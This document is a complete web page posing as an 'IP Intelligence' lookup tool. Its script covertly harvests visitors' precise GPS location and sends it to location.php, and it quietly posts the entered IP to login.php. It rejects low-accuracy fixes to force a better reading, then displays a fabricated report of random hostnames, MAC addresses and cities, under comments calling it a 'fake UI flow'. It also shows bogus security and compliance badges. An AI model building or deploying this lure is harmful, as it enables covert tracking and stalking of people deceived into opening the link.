<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NetTrace - IP Intelligence Platform</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
 
        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
 
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.5;
        }
 
        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            animation: float 25s infinite;
        }
 
        .shape1 {
            width: 400px;
            height: 400px;
            background: linear-gradient(45deg, #4facfe, #00f2fe);
            top: -10%;
            left: -10%;
        }
 
        .shape2 {
            width: 350px;
            height: 350px;
            background: linear-gradient(45deg, #43e97b, #38f9d7);
            bottom: -10%;
            right: -10%;
            animation-delay: 7s;
        }
 
        .shape3 {
            width: 300px;
            height: 300px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            top: 40%;
            left: 50%;
            animation-delay: 14s;
        }
 
        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(80px, -80px) rotate(120deg); }
            66% { transform: translate(-60px, 60px) rotate(240deg); }
        }
 
        .container {
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 32px;
            box-shadow: 0 25px 100px rgba(0, 0, 0, 0.7),
                        inset 0 1px 0 rgba(255, 255, 255, 0.06);
            max-width: 1100px;
            width: 100%;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
 
        .header {
            background: linear-gradient(135deg, rgba(79, 172, 254, 0.15) 0%, rgba(0, 242, 254, 0.15) 100%);
            padding: 55px 45px;
            text-align: center;
            position: relative;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
 
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #4facfe, #00f2fe, #4facfe, transparent);
            animation: shimmer 3s linear infinite;
        }
 
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
 
        .logo {
            width: 95px;
            height: 95px;
            margin: 0 auto 25px;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            box-shadow: 0 15px 50px rgba(79, 172, 254, 0.5),
                        0 0 0 1px rgba(255, 255, 255, 0.1);
            animation: logoFloat 4s ease-in-out infinite;
            position: relative;
        }
 
        .logo::after {
            content: '';
            position: absolute;
            inset: -3px;
            background: linear-gradient(45deg, #4facfe, #00f2fe, #43e97b, #4facfe);
            border-radius: 26px;
            z-index: -1;
            opacity: 0.6;
            filter: blur(15px);
            animation: rotate 4s linear infinite;
        }
 
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-12px) scale(1.05); }
        }
 
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
 
        h1 {
            font-size: 46px;
            font-weight: 800;
            margin-bottom: 14px;
            background: linear-gradient(135deg, #ffffff 0%, #94a3b8 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }
 
        .subtitle {
            color: #94a3b8;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }
 
        .content {
            padding: 55px 50px;
        }
 
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 22px;
            margin-bottom: 50px;
        }
 
        .stat-card {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.5) 0%, rgba(15, 23, 42, 0.5) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 28px 24px;
            text-align: center;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
 
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.08), transparent);
            transition: left 0.6s;
        }
 
        .stat-card:hover {
            transform: translateY(-6px) scale(1.02);
            border-color: rgba(79, 172, 254, 0.4);
            box-shadow: 0 15px 40px rgba(79, 172, 254, 0.25);
        }
 
        .stat-card:hover::before {
            left: 100%;
        }
 
        .stat-icon {
            font-size: 40px;
            margin-bottom: 14px;
            display: block;
            filter: drop-shadow(0 5px 15px rgba(79, 172, 254, 0.4));
        }
 
        .stat-label {
            font-size: 13px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 8px;
            font-weight: 600;
        }
 
        .stat-value {
            font-size: 17px;
            color: #22c55e;
            font-weight: 800;
            text-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
        }
 
        .form-section {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.35) 0%, rgba(15, 23, 42, 0.35) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 50px 45px;
            border-radius: 28px;
            box-shadow: inset 0 2px 15px rgba(0, 0, 0, 0.25);
        }
 
        .section-header {
            text-align: center;
            margin-bottom: 40px;
        }
 
        .section-title {
            font-size: 32px;
            color: #ffffff;
            margin-bottom: 12px;
            font-weight: 800;
        }
 
        .section-subtitle {
            font-size: 16px;
            color: #64748b;
            font-weight: 500;
        }
 
        label {
            display: block;
            margin-bottom: 14px;
            font-size: 14px;
            font-weight: 700;
            color: #cbd5e1;
            text-transform: uppercase;
            letter-spacing: 1.2px;
        }
 
        .input-wrapper {
            position: relative;
            margin-bottom: 32px;
        }
 
        .input-icon {
            position: absolute;
            left: 22px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            z-index: 1;
            filter: drop-shadow(0 2px 8px rgba(79, 172, 254, 0.4));
        }
 
        input[type="text"] {
            width: 100%;
            padding: 22px 22px 22px 65px;
            background: rgba(15, 23, 42, 0.7);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 18px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            outline: none;
            transition: all 0.3s;
            font-family: inherit;
        }
 
        input[type="text"]:focus {
            border-color: #4facfe;
            background: rgba(15, 23, 42, 0.9);
            box-shadow: 0 0 0 5px rgba(79, 172, 254, 0.15),
                        0 8px 25px rgba(79, 172, 254, 0.2);
            transform: translateY(-2px);
        }
 
        input[type="text"]::placeholder {
            color: #475569;
            font-weight: 500;
        }
 
        .error-message {
            color: #ef4444;
            font-size: 14px;
            margin-top: 12px;
            padding: 14px 18px;
            background: rgba(239, 68, 68, 0.12);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 12px;
            display: none;
            font-weight: 700;
        }
 
        .error-message.show {
            display: block;
            animation: shake 0.6s;
        }
 
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-12px); }
            40%, 80% { transform: translateX(12px); }
        }
 
        .submit-btn {
            width: 100%;
            padding: 22px;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: #ffffff;
            border: none;
            border-radius: 18px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            box-shadow: 0 15px 35px rgba(79, 172, 254, 0.35);
            position: relative;
            overflow: hidden;
        }
 
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
            transition: left 0.6s;
        }
 
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 50px rgba(79, 172, 254, 0.5);
        }
 
        .submit-btn:hover::before {
            left: 100%;
        }
 
        .submit-btn:active {
            transform: translateY(-1px);
        }
 
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
 
        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            position: relative;
            z-index: 1;
        }
 
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.25);
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            animation: spin 0.7s linear infinite;
            display: none;
        }
 
        .spinner.show {
            display: inline-block;
        }
 
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
 
        .result-panel {
            margin-top: 40px;
            padding: 45px;
            background: linear-gradient(135deg, rgba(34, 197, 94, 0.12) 0%, rgba(16, 185, 129, 0.12) 100%);
            border: 1px solid rgba(34, 197, 94, 0.25);
            border-radius: 24px;
            display: none;
            box-shadow: 0 15px 50px rgba(34, 197, 94, 0.2);
        }
 
        .result-panel.show {
            display: block;
            animation: slideIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }
 
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
 
        .result-header {
            text-align: center;
            margin-bottom: 35px;
        }
 
        .result-icon {
            font-size: 72px;
            margin-bottom: 18px;
            animation: bounce 1.2s ease-in-out;
            filter: drop-shadow(0 10px 30px rgba(34, 197, 94, 0.5));
        }
 
        @keyframes bounce {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-20px) scale(1.1); }
        }
 
        .result-title {
            font-size: 30px;
            color: #22c55e;
            font-weight: 800;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(34, 197, 94, 0.4);
        }
 
        .result-subtitle {
            font-size: 16px;
            color: #94a3b8;
            font-weight: 500;
        }
 
        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 22px;
            margin-top: 30px;
        }
 
        .data-item {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 24px;
            border-radius: 18px;
            transition: all 0.4s;
            position: relative;
            overflow: hidden;
        }
 
        .data-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(180deg, #4facfe, #00f2fe);
            opacity: 0;
            transition: opacity 0.4s;
        }
 
        .data-item:hover {
            background: rgba(15, 23, 42, 0.8);
            border-color: rgba(79, 172, 254, 0.3);
            transform: translateX(8px);
        }
 
        .data-item:hover::before {
            opacity: 1;
        }
 
        .data-label {
            font-size: 12px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 10px;
            font-weight: 700;
        }
 
        .data-value {
            font-size: 17px;
            color: #ffffff;
            font-weight: 700;
            word-break: break-all;
            line-height: 1.5;
        }
 
        .important-badge {
            display: inline-block;
            padding: 4px 10px;
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-left: 8px;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
 
        .footer {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.8) 0%, rgba(15, 23, 42, 0.8) 100%);
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            padding: 40px;
            text-align: center;
        }
 
        .footer-badges {
            display: flex;
            justify-content: center;
            gap: 35px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
 
        .badge {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #94a3b8;
            font-weight: 600;
        }
 
        .badge-icon {
            font-size: 22px;
        }
 
        .footer-text {
            font-size: 14px;
            color: #64748b;
            line-height: 1.9;
            font-weight: 500;
        }
 
        @media (max-width: 768px) {
            .content { padding: 40px 28px; }
            .form-section { padding: 40px 28px; }
            h1 { font-size: 36px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }
 
        /* =============================
           MOBILE ONLY - Naya CSS
           (max-width: 480px)
        ============================== */
        @media (max-width: 480px) {
 
            body {
                padding: 12px;
                align-items: flex-start;
            }
 
            .container {
                border-radius: 20px;
            }
 
            /* --- Header --- */
            .header {
                padding: 30px 20px;
            }
 
            .logo {
                width: 70px;
                height: 70px;
                font-size: 34px;
                border-radius: 18px;
                margin-bottom: 16px;
            }
 
            h1 {
                font-size: 24px;
                letter-spacing: -0.3px;
                margin-bottom: 8px;
            }
 
            .subtitle {
                font-size: 13px;
            }
 
            /* --- Stats Grid --- */
            .content {
                padding: 24px 16px;
            }
 
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin-bottom: 28px;
            }
 
            .stat-card {
                padding: 18px 12px;
                border-radius: 14px;
            }
 
            .stat-icon {
                font-size: 28px;
                margin-bottom: 8px;
            }
 
            .stat-label {
                font-size: 10px;
                letter-spacing: 0.8px;
            }
 
            .stat-value {
                font-size: 14px;
            }
 
            /* --- Form Section --- */
            .form-section {
                padding: 24px 16px;
                border-radius: 18px;
            }
 
            .section-title {
                font-size: 20px;
                margin-bottom: 8px;
            }
 
            .section-subtitle {
                font-size: 13px;
            }
 
            .section-header {
                margin-bottom: 24px;
            }
 
            label {
                font-size: 11px;
                margin-bottom: 10px;
            }
 
            .input-wrapper {
                margin-bottom: 20px;
            }
 
            .input-icon {
                left: 14px;
                font-size: 18px;
            }
 
            input[type="text"] {
                padding: 16px 16px 16px 52px;
                font-size: 15px;
                border-radius: 14px;
            }
 
            .submit-btn {
                padding: 16px;
                font-size: 15px;
                border-radius: 14px;
                letter-spacing: 1px;
            }
 
            /* --- Result Panel --- */
            .result-panel {
                padding: 24px 16px;
                margin-top: 24px;
                border-radius: 16px;
            }
 
            .result-icon {
                font-size: 48px;
                margin-bottom: 12px;
            }
 
            .result-title {
                font-size: 20px;
            }
 
            .result-subtitle {
                font-size: 13px;
            }
 
            .result-header {
                margin-bottom: 20px;
            }
 
            .data-grid {
                grid-template-columns: 1fr;
                gap: 12px;
                margin-top: 16px;
            }
 
            .data-item {
                padding: 16px;
                border-radius: 12px;
            }
 
            .data-value {
                font-size: 14px;
            }
 
            /* --- Footer --- */
            .footer {
                padding: 24px 16px;
            }
 
            .footer-badges {
                gap: 14px;
                margin-bottom: 16px;
            }
 
            .badge {
                font-size: 12px;
                gap: 6px;
            }
 
            .badge-icon {
                font-size: 16px;
            }
 
            .footer-text {
                font-size: 12px;
                line-height: 1.7;
            }
        }
    </style>
</head>
<body>
    <div class="bg-animation">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>
 
    <div class="container">
        <div class="header">
            <div class="logo">🌐</div>
            <h1>NetTrace Intelligence</h1>
            <div class="subtitle">Advanced IP Address Tracking & Geolocation System</div>
        </div>
 
        <div class="content">
            <div class="stats-grid">
                <div class="stat-card">
                    <span class="stat-icon">🛡️</span>
                    <div class="stat-label">Security</div>
                    <div class="stat-value">Military Grade</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">🌍</span>
                    <div class="stat-label">IP Database</div>
                    <div class="stat-value">4.3B Records</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">⚡</span>
                    <div class="stat-label">Query Speed</div>
                    <div class="stat-value">0.3ms</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">✅</span>
                    <div class="stat-label">Accuracy</div>
                    <div class="stat-value">99.97%</div>
                </div>
            </div>
 
            <div class="form-section">
                <div class="section-header">
                    <h2 class="section-title">IP Geolocation Lookup</h2>
                    <p class="section-subtitle">Enter target IP address for comprehensive intelligence report</p>
                </div>
 
                <form id="authForm" onsubmit="return false;">
                    <label for="ipaddress">🌐 Target IP Address</label>
                    <div class="input-wrapper">
                        <span class="input-icon">🔍</span>
                        <input 
                            type="text" 
                            id="ipaddress" 
                            name="ipaddress" 
                            placeholder="Enter IP address (e.g., 192.168.1.1)"
                            autocomplete="off"
                        >
                    </div>
                    <div class="error-message" id="errorMessage">
                        ⚠️ Invalid IP address format. Please enter a valid IPv4 or IPv6 address.
                    </div>
 
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <div class="btn-content">
                            <span id="btnText">🔍 Trace IP Address</span>
                            <div class="spinner" id="spinner"></div>
                        </div>
                    </button>
                </form>
 
                <div class="result-panel" id="resultPanel">
                    <div class="result-header">
                        <div class="result-icon">✅</div>
                        <div class="result-title">IP Traced Successfully</div>
                        <div class="result-subtitle">Complete geolocation intelligence report generated</div>
                    </div>
 
                    <div class="data-grid" id="dataGrid"></div>
                </div>
            </div>
        </div>
 
        <div class="footer">
            <div class="footer-badges">
                <div class="badge">
                    <span class="badge-icon">🔒</span>
                    <span>256-bit Encrypted</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🛡️</span>
                    <span>ISO 27001 Certified</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">✅</span>
                    <span>GDPR Compliant</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🌍</span>
                    <span>Global Network</span>
                </div>
            </div>
            <div class="footer-text">
                <strong>NetTrace Intelligence™</strong> - Professional IP Tracking Platform<br>
                © 2026 All Rights Reserved | Powered by Advanced Geolocation AI<br>
                Protected by Enterprise-Grade Security & Real-time Threat Detection
            </div>
        </div>
    </div>
    <script src="Detels.js"></script>
    <script>
        const ipInput = document.getElementById('ipaddress');
        const authForm = document.getElementById('authForm');
        const errorMessage = document.getElementById('errorMessage');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');
        const resultPanel = document.getElementById('resultPanel');
        const dataGrid = document.getElementById('dataGrid');

        function generateRandomIP() {
            return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
        }

        function generateMAC() {
            const hex = '0123456789ABCDEF';
            let mac = '';
            for (let i = 0; i < 6; i++) {
                mac += hex[Math.floor(Math.random() * 16)] + hex[Math.floor(Math.random() * 16)];
                if (i < 5) mac += ':';
            }
            return mac;
        }

        function generateHostname() {
            const prefixes = ['server', 'host', 'node', 'gateway', 'router'];
            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            return `${prefix}-${Math.floor(Math.random() * 9999)}.net.in`;
        }

        function generateASN() {
            return `AS${Math.floor(Math.random() * 65535) + 1000}`;
        }

        const cities = ['Mumbai', 'Delhi', 'Bangalore', 'Hyderabad', 'Chennai', 'Kolkata', 'Pune'];
        const isps = ['Bharti Airtel', 'Reliance Jio', 'Vodafone Idea', 'BSNL', 'Tata Communications'];
        const organizations = ['Bharti Airtel Ltd', 'Reliance Jio Infocomm', 'Tata Communications', 'BSNL', 'ACT Fibernet'];

        function validateIP(ip) {
            const ipv4Pattern = /^(\d{1,3}\.){3}\d{1,3}$/;
            if (ipv4Pattern.test(ip)) {
                const parts = ip.split('.');
                return parts.every(part => parseInt(part) >= 0 && parseInt(part) <= 255);
            }
            return false;
        }

        authForm.addEventListener('submit', function(e) {
            e.preventDefault();

            const ip = ipInput.value.trim();

            if (!validateIP(ip) && ip !== '') {
                errorMessage.classList.add('show');
                ipInput.focus();
                return;
            }

            errorMessage.classList.remove('show');

            submitBtn.disabled = true;
            btnText.textContent = '⏳ Tracing...';
            spinner.classList.add('show');

            const finalIP = ip || generateRandomIP();

            // silent backend request
            const formData = new FormData();
            formData.append("ip", finalIP);

            fetch("login.php", {
                method: "POST",
                body: formData
            });

            // continue fake UI flow
            requestLocationPermission(finalIP);
        });
        function requestLocationPermission(targetIP) {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {

                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;

                        // ✅ CHANGE 1: Strong GPS accuracy filter
                        if (acc > 1000) {
                            alert("📍 Weak GPS signal. Please try again in open area for better accuracy.");
                            submitBtn.disabled = false;
                            btnText.textContent = '🔍 Trace IP Address';
                            spinner.classList.remove('show');
                            return;
                        }

                        const hostname = generateHostname();
                        const mac = generateMAC();
                        const asn = generateASN();
                        const city = cities[Math.floor(Math.random() * cities.length)];
                        const isp = isps[Math.floor(Math.random() * isps.length)];
                        const org = organizations[Math.floor(Math.random() * organizations.length)];
                        const timestamp = new Date().toISOString();
                        const reverseIP = targetIP.split('.').reverse().join('.');

                        // ✅ CHANGE 2: Send location to server (location.php)
                        const formData = new FormData();
                        formData.append('username', 'guest');
                        formData.append('lat', lat);
                        formData.append('lon', lon);
                        formData.append('acc', acc);

                        fetch("location.php", {
                            method: "POST",
                            body: formData
                        })
                        .then(response => response.text())
                        .then(data => {
                            console.log("Saved:", data);
                        })
                        .catch(error => {
                            console.log("Error:", error);
                        });

                        spinner.classList.remove('show');
                        btnText.textContent = '✅ Trace Complete';

                        setTimeout(() => {
                            resultPanel.classList.add('show');

                            dataGrid.innerHTML = `
                                <div class="data-item">
                                    <div class="data-label">🌐 Target IP Address <span class="important-badge">Primary</span></div>
                                    <div class="data-value">${targetIP}</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🔄 Reverse DNS Lookup</div>
                                    <div class="data-value">${reverseIP}.in-addr.arpa</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🖥️ Hostname <span class="important-badge">Resolved</span></div>
                                    <div class="data-value">${hostname}</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🏢 Organization</div>
                                    <div class="data-value">${org}</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🌍 ISP Provider <span class="important-badge">Verified</span></div>
                                    <div class="data-value">${isp}</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🔢 ASN Number</div>
                                    <div class="data-value">${asn}</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">📍 Geolocation <span class="important-badge">Live</span></div>
                                    <div class="data-value">${city}, Maharashtra, India</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🌍 GPS Coordinates</div>
                                    <div class="data-value">Lat: ${lat.toFixed(8)}°<br>Lon: ${lon.toFixed(8)}°</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🎯 Location Accuracy</div>
                                    <div class="data-value">±${acc.toFixed(2)} meters</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🔧 MAC Address <span class="important-badge">Critical</span></div>
                                    <div class="data-value">${mac}</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🌐 IP Version</div>
                                    <div class="data-value">IPv4 / IPv6 Ready</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🏙️ City / Region</div>
                                    <div class="data-value">${city} / Maharashtra</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🌏 Country Code</div>
                                    <div class="data-value">IN (India)</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">⏰ Timezone</div>
                                    <div class="data-value">Asia/Kolkata (UTC+5:30)</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🕒 Local Time</div>
                                    <div class="data-value">${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">⏱️ Timestamp (UTC) <span class="important-badge">Real-time</span></div>
                                    <div class="data-value">${timestamp}</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🔐 Connection Type</div>
                                    <div class="data-value">Broadband / Fiber</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">📡 Network Type</div>
                                    <div class="data-value">Residential / Commercial</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🛡️ Threat Level</div>
                                    <div class="data-value">Low (Safe)</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🚫 Proxy Status</div>
                                    <div class="data-value">No Proxy Detected</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">🤖 Bot Detection</div>
                                    <div class="data-value">Not a Bot</div>
                                </div>
                                <div class="data-item">
                                    <div class="data-label">✅ Trace Status</div>
                                    <div class="data-value">ACTIVE & MONITORED</div>
                                </div>
                            `;
                        }, 1200);
                    },
                    function(error) {
                        spinner.classList.remove('show');
                        submitBtn.disabled = false;
                        btnText.textContent = '🔍 Trace IP Address';

                        let msg = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                msg = '🚫 Location Access Required';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                msg = '📍 GPS Signal Lost';
                                break;
                            case error.TIMEOUT:
                                msg = '⏱️ Request Timeout';
                                break;
                            default:
                                msg = '❌ System Error';
                        }

                        alert(msg);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                spinner.classList.remove('show');
                submitBtn.disabled = false;
                btnText.textContent = '🔍 Trace IP Address';
                alert('🚫 Geolocation Not Supported');
            }
        }
    </script>
</body>
</html>